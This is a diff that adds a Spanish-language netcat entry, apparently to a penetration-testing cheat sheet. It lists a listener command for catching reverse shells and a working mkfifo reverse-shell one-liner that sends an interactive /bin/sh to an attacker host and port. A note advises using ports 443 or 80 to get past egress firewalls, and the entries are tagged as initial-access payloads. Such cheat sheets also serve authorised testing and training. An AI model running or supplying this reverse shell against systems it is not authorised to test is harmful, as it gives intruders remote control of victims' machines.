@@ -1,0 +1,26 @@
+# Netcat: listener para recibir reverse shells y shell directa por mkfifo cuando no hay -e.
+tool: nc
+area: shells
+url: https://man.openbsd.org/nc.1
+commands:
+  - id: nc-listener
+    title: Listener para una reverse shell
+    cmd: |
+      nc -lvnp {{LPORT}}
+    phase: initial-access
+    tags: [reverse-shell]
+    notes: >-
+      -l escucha, -v informa, -n sin DNS, -p el puerto. Para puertos por debajo de 1024 (443, 80) hace
+      falta sudo; esos suelen cruzar mejor los firewalls de salida.
+    refs: [https://man.openbsd.org/nc.1]
+
+  - id: nc-revshell
+    title: Reverse shell con netcat (sin -e)
+    cmd: |
+      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f
+    phase: initial-access
+    tags: [reverse-shell, payloads]
+    notes: >-
+      La variante portable para los netcat sin -e (los de OpenBSD). El mkfifo hace de tubería de ida y
+      vuelta entre la shell y la conexión.
+    refs: [https://github.com/swisskyrepo/PayloadsAllTheThings]
